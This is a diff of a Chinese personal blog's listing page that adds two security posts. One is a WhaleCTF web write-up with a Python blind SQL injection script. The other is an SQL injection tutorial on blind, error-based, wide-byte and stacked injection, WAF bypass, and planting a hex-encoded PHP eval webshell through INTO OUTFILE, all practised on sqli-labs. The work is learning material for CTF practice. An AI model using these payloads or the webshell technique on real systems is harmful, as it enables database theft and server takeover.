@@ -90,6 +90,227 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
+                    WhaleCTF的Web题目 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-06-06   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
+<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
+<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
+<pre><code>#coding:utf-8
+import requests
+
+def send(flag,charset):
+    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
+    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    for i in range(len(charset)):
+        c = flag + charset[i]
+        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
+        d = &quot;username={}&amp;password=admin&quot;.format(payload)
+        r = requests.post(url,data=d,headers=h)
+        if &quot;whaleadmin&quot; in r.text:
+            return i
+
+def main():
+    flag = &quot;&quot;
+    num = &quot;0123456789&quot;
+    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    charset = list(num + a_z)
+    for i in range(0,80):
+        ret = send(flag, charset)
+        flag += charset[ret-1]
+        print flag
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
+<pre><code>&lt;?php
+echo &quot;waht the hell?&quot;;
+$flag = &quot;*******&quot;; 
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
+{ 
+    $password = $_POST[&#39;password&#39;]; 
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
+    { 
+        echo &#39;Wrong Format&#39;; 
+        exit; 
+    } 
+    while (TRUE) 
+    { 
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
+        if (6 &gt; preg_match_all($reg, $password, $arr)) 
+            break; 
+        $c = 0; 
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
+        foreach ($ps as $pt) 
+        { 
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
+                $c += 1; 
+        } 
+        if ($c &lt; 3) break; 
+        if (&quot;42&quot; == $password) echo $flag; 
+        else echo &#39;Wrong password&#39;; 
+        exit; 
+    } 
+}
+?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
+<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
+<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
+<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/06/06/WhaleCTF的Web题目/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/05/28/sql简单的注入和常见的waf绕过/"> 
+                    sql简单的注入和常见的waf绕过 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-05-28   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/sql基础/">sql基础</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前一阵子为了做Ctf题临时补了一阵子mysql的相关知识，了解了一些简单的注入流程：查字段数-&gt;查库-&gt;查表-&gt;爆字段。但是应用实战或者其他稍微困难一些的Sql注入题这些还远远不够，所以决定重新学习，系统的做一下归类，并记录一下学习的过程</p>
+<hr>
+<h2 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h2><p>本地用Phostudy搭建的PHP+MYSQL环境，写了一个简单的php，类似于无脑的ctf注入题，get传参Id值</p>
+<h2 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h2><p>刚才我们写的Php就是一个没有任何过滤的后端,值得注意的是,#的注释功能现在好像被和谐掉了，在Hackbar只能编码为%23才能代替#的作用（我竟然花了好长时间反复查看自己到底有没有过滤qaq），接下来看一下这类绝迹注入的流程.如果你本地有DVWA的环境,就直接注Simple类型就好了,先贴一张表的结构<br><img src="https://s1.ax1x.com/2018/05/30/C5JnSJ.png" alt="表结构"></p>
+<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><pre><code>?id=1&#39; order by 1/2/3... %23</code></pre><p>找到一个有回显的注入点，手动去猜字段，返回异常的N-1即为字段数</p>
+<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><p>这里字段数确认为3</p>
+<pre><code>?id=-1&#39; select 1,2,database() %23</code></pre><p>两个月前刚学的时候没有搞清楚没什么Id要改成-1,其实很好理解,mysql的查询如果你的查询是存在的即返回结果,若查询不存在即返回查询结果.<br><img src="https://s1.ax1x.com/2018/05/30/C5JMO1.png" alt="avator"></p>
+<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>?id=-1&#39; select 1,2,table_name from infomation_schema.tables where table_schema=database() %23</code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>?id=-1&#39; select 1,2,column_name from information_schema.columns where table_name=&#39;user&#39; %23</code></pre><p>其中User为我们刚才查到的表</p>
+<h3 id="查列名下的具体值"><a href="#查列名下的具体值" class="headerlink" title="查列名下的具体值"></a>查列名下的具体值</h3><pre><code>?id=-1&#39; select 1,2,user from user %23</code></pre><p>选择查询的列为user列,一般来说ctf的题都是让你查flag列下的值,Dump出来就好.</p>
+<h3 id="关于Information-schema"><a href="#关于Information-schema" class="headerlink" title="关于Information_schema"></a>关于Information_schema</h3><p>MySQL 中有一个数据库叫做information_schema，储存数据库和表的元信息。information_schema中有两个重要的表，一个叫tables，储存表的元信息，有两列特别重要，table_schema是所属数据库，table_name是表名称。另一个表示columns，储存列的源信息，table_name列是所属表名称，column_name列是列名称</p>
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。其实我们用sqlmap完全可以跑，但是只会用工具最多也就是个脚本小子，要想更好的运用Sqlmap进行注入，我觉得应该从基础学起，搞清楚原理才是最重要的。</p>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>先贴一张自己写的php<br><img src="https://s1.ax1x.com/2018/05/30/C5JGFO.png" alt="avator"><br>即回显只有ture or false</p>
+<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>普及一下用法，用mysql演示一下：<br><img src="https://s1.ax1x.com/2018/05/30/C5JNSH.png" alt="limit1"></p>
+<p><img src="https://s1.ax1x.com/2018/05/30/C5JYfe.png" alt="limit2"></p>
+<p><img src="https://s1.ax1x.com/2018/05/30/C5JJYD.png" alt="limit3"></p>
+<h4 id="猜库长"><a href="#猜库长" class="headerlink" title="猜库长"></a>猜库长</h4><pre><code>?id=1&#39; and length(database())=? %23</code></pre><p>?即为猜解的裤长，可以用二分法，及大于1，小于100，再从50划分长度。若条件成立返回ture</p>
+<h4 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h4><p>substr()函数</p>
+<p>substr(string,start,length)</p>
+<ul>
+<li><p>string(必需)规定要返回其中一部分的字符串。</p>
+</li>
+<li><p>start(必需)规定在字符串的何处开始。</p>
+</li>
+<li><p>length(可选)规定被返回字符串的长度。</p>
+</li>
+</ul>
+<p>令外用到ascii()函数，返回查询到的字符的ascii的十进制值，通过大于或者小于的逻辑判断这个值为多少，进而遍历完整的数据库名。<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;? %23</code><br>通过分析，返回的ascii确认为104，对应‘h’，与库名的hpdoger的第一个字母相应。</p>
+<h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><p>这里需要在substr里嵌套mysql的语句，因为我们要找到对应的表，结合普通查询的语句来构造我们的payload</p>
+<pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;116 %23</code></pre><pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&lt;118 %23</code></pre><p>两者返回都为ture，可以判断第一个字母ascii值为117<br><img src="https://s1.ax1x.com/2018/05/30/C5JDTf.png" alt="chabiao"><br><img src="https://s1.ax1x.com/2018/05/30/C5JB0P.png" alt="chabiao"></p>
+<h4 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5J2lj.png" alt="lieming"><br>此语句猜解的是user表的第一个列名，如是想要猜解其它列名，则更改Limit 的值</p>
+<h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5Ylcj.png" alt="ziduanzhi"><br>道理相同</p>
+<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>返回页面无法判断语句是否执行， 面对这种情况，基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时</p>
+<h4 id="if-与sleep（）"><a href="#if-与sleep（）" class="headerlink" title="if()与sleep（）"></a>if()与sleep（）</h4><p>其实，基于时间的盲注也是运用逻辑判断。首先看一下if()函数:</p>
+<ul>
+<li><p>if()<br><code>if(expr1,expr2,expr3)</code><br>如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。</p>
+</li>
+<li><p>sleep()</p>
+<pre><code>sleep(seconds)</code></pre><p>延时一段时间</p>
+</li>
+</ul>
+<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>基本思想跟与布尔盲注一样，给一句话，其他的换成相应查询就可以了</p>
+<pre><code>?id=1 and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</code></pre><h2 id="关于绕过Waf"><a href="#关于绕过Waf" class="headerlink" title="关于绕过Waf"></a>关于绕过Waf</h2><h3 id="浅谈编码绕过waf"><a href="#浅谈编码绕过waf" class="headerlink" title="浅谈编码绕过waf"></a>浅谈编码绕过waf</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>这两天一直在刷sqli-labs，做到现在有一点感触。一开始知道有url编码绕过这种方式，但是对于为什么能绕过成功心里是没B数的。经过这两天的测试，我想说的是，这种url编码绕过简直扯淡。人家waf过滤掉了你，你就算编码传过去一个值，到了php页面又被还原再判断，所以相当于没有任何作用。但还是写一下关于url编码的一些理解：</p>
+<p>在GET传参的时候,Chrome的url会自动进行编码，而编码形式就是utf-8。一般来说，这个自动编码保留字母和数字不编的形式。其实，我感觉utf-8编码就是为了应对中文问题才诞生的。再说一下解码的问题吧，最初我不理解在php后端什么时候将url解码，后来自己用php传参，echo的结果显示，我们在用$_GET[]时，就将url给解码了。即还原了你的传参原值。所以url编码绕过就是扯淡</p>
+<h4 id="0A换行污染"><a href="#0A换行污染" class="headerlink" title="%0A换行污染"></a>%0A换行污染</h4><p>在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。可以用%0a代替空格使用</p>
+<h4 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>这个目前理解尚浅，在列库名或者表名的时候用过，因为可以避免使用单引号闭合。在concat函数里用过，作为分隔符。即0x7e表示‘~’。</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>不得不说updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p>
+<pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>0x7e是为了构造~分割<br><img src="https://s1.ax1x.com/2018/06/03/CTY9zD.png" alt="1"><br>它爆出了我们查询的库名，只要稍加修改，就可以查表、列、字段等。功能强大，依靠它打lab简直爽的不行。报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
+<h3 id="宽子节注入"><a href="#宽子节注入" class="headerlink" title="宽子节注入"></a>宽子节注入</h3><p>对于mysql_escape_string或者是mysql_real_escape_string函数转义的单引号，我们都可以用宽子节注入使单引号逃逸。</p>
+<ul>
+<li>在GET类型中，我们在单引号前加一个Ascii大于128的编码，因为mysql是以gbk形式读编码的。例如我们构造%df’，则转义后变成<code>%df%5c%27</code>，那么mysql执行语句时，看到前两个编码会结合为汉字，从而是单引号逃逸。</li>
+<li>在POST类型中，我们无法再使用%df进行宽子节注入。POST与GET不同，php端不对%df解码（参考对url编码的理解），而是在执行sql查询的时候对%df再进行一次utf-8的编码。结果就是，你在进行sql查询时本想借助%df逃逸，但是现在没有%df可以利用。网上提供了另一种用utf-16进行宽子节注入的payload，这里我拿来用一下，至于为什么utf-16可以借助逃逸，这个我以后学习了16和8的具体转换方式再补上。playload:<pre><code>?id=1� &#39;</code></pre></li>
+</ul>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入顾名思义，这里简单说一下储值型的二次注入：我们将要执行的sql语句通过注册用户操作，存储到服务器里，当我们再一次进行操作时直接调用服务器里我们存储的sql语句就可以了（例如修改密码时）。举一个lab里的例子，我们注册用户登陆后,session会获得一个用户名，在那道题里，没有对session得到的用户名进行过滤，而是直接把密码更新到获取的session的用户名下，如果我们的用户名为admin’#，那么就相当于更新了Admin的密码。</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入区别于二次注入，当没有创建新用户的选项时，可以考虑堆叠注入，在登陆时创建一个新用户入。先看一下labs-42的源码</p>
+<pre><code>   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+   $password = $_POST[&quot;login_password&quot;];
+   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></pre><p>可以对Username过滤但是未对password过滤，我们就可以为所欲为了。可以通过报错或者盲注查询出表名，构造语句向表中插入用户数据。payload如下：<br><code>login_user=123&amp;login=a&#39;;insert into users values(16,&#39;Hodoger&#39;,&#39;zq1160307775&#39;) #</code><br>show tables成功显示我们插入的用户，前提是你要查到这个登陆基于users这个表，至于怎么查，各显神通了。</p>
+<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by不能与union select 连用，所以注入就要换思路，可以用报错注入或者延时注入。</p>
+<ul>
+<li>报错注入的话，在之前以后列出过十种报错函数可以利用</li>
+<li>还有一种注入手段是依靠rand()函数，order by 后的参数直接为rand()，rand中含有表达式，根据rand(ture/false)返回时序列不同来判断表达式是否正确，这里我们以查询库名为例写一个payload猜解:<pre><code>?sort=rand(ascii(left(database(),1))&gt;150)
+</code></pre></li>
+</ul>
+<p>?sort=rand(ascii(left(database(),1))&lt;200)<br>```<br>sort参数php端用来接收order by处理的值，其实和布尔盲注的思想有些类似</p>
+<ul>
+<li>延时注入<br>与基于时间的盲注思路差不多，构造 and if语句</li>
+</ul>
+<h2 id="权限的注入"><a href="#权限的注入" class="headerlink" title="权限的注入"></a>权限的注入</h2><h3 id="into-outfile的传马"><a href="#into-outfile的传马" class="headerlink" title="into outfile的传马"></a>into outfile的传马</h3><p>MySQL中，可以使用SELECT…INTO OUTFILE语句将表的内容导出为一个文本文件。其基本的语法格式如下：<br><code>select [列名] from table into outfile &#39;目标文件&#39; [option]</code><br>意思就是你查询的列名导出到目标文件中。<br>具体看一道sql labs 46，基于order by 注入的题目<br>payload:</p>
+<p><code>?sort=1 into outfile &#39;D:\\phpStudy\\WWW\\sqli-labs-master\\Less-46\\test.php&#39; lines terminated by 0x3c3f706870206576616c28245f504f53545b6870646f6765725d293b203f3e</code><br>sort是题目里给的order by要查询的参数，outfile后接网站的绝对路径，test.php是我要写入的文件（没有时新建），lines terminated by接木马的16进制。union select 也可以与into outfile联合使用，因为这道题是order by注入无法使用union select写入，所以借助了lines terminated by 。<br>但是我在写入的时候出现下面的页面<br><img src="https://s1.ax1x.com/2018/06/05/C7WJI0.png" alt="shibai"><br>这就是into outfile的限制了。写入之前先看看into outfile 的权限吧：<br>如果要实现用into outfile把代码写到WEB目录下，取得WEBSHELL</p>
+<p><strong>3大先天条件</strong>：</p>
+<ol>
+<li><p>知道物理路径（into outfile ‘WEB目录的物理路径’）这样才能写对目录。（默认的当前目录是MySQL的数据目录）</p>
+</li>
+<li><p>能够使用union（也就是MySQL版本在3以上）</p>
+</li>
+<li><p>没有对’进行过滤（因为outfile后面的’’不可以用其他函数代替转换）</p>
+</li>
+</ol>
+<p><strong>2大后天条件</strong>：</p>
+<ol>
+<li><p>MySQL用户拥有file_priv权限（不然就不能写文件或者把文件内容读出）</p>
+</li>
+<li><p>对web目录有写权限。<br>很明显，我没有file_priv的权限，在mysql里查看一下也能看到，如图<br><img src="https://s1.ax1x.com/2018/06/05/C7W8Zn.png" alt="quanxian"><br>可以自行百度一下如何在windows下开启file_priv的权限，其实就是在my.ini里把路径置空就好，重启mysql。开启后再执行payload显示如下图：<br><img src="https://s1.ax1x.com/2018/06/05/C7WtiV.png" alt="chenggong"><br>在路径下看一下传马是否成功，如图<br><img src="https://s1.ax1x.com/2018/06/05/C7WURU.png" alt="muma"><br>菜刀连接一下，成功<br><img src="https://s1.ax1x.com/2018/06/05/C7WazF.png" alt="caodao"><br>传马成功，下一步就是花样提权。不过目前导出文件的file_priv几乎都不会开启，即root的权限过低，所以可以想办法把它开启。</p>
+</li>
+</ol>
+<hr>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最近大佬丢了我一本sqli-labs的武林秘籍，手工打完了还是有很大收获。其实里面很多题也是可以放到sqlmap里跑，但是做个脚本小子并不是我想要的，最近忙完了转专业这些事，准备闭关修炼一下。先在这里贴一些sqlmap里tamper的用法和介绍，<a href="https://blog.csdn.net/whatday/article/details/61912578" target="_blank" rel="noopener">博客</a>总结的很好，而且也po出来一些Url，可以参考一下。</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/05/28/sql简单的注入和常见的waf绕过/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
                 <a class="title" href="/2018/05/26/利用Hexo和Github搭建个人博客/"> 
                     利用Hexo和Github搭建个人博客 
                 </a>
@@ -181,7 +402,7 @@ branch: master</code></pre>
             </div>
             <div class="continue">
             <a href="/2018/05/26/利用Hexo和Github搭建个人博客/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -189,7 +410,7 @@ branch: master</code></pre>
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span>
   </nav>
 
     </main>
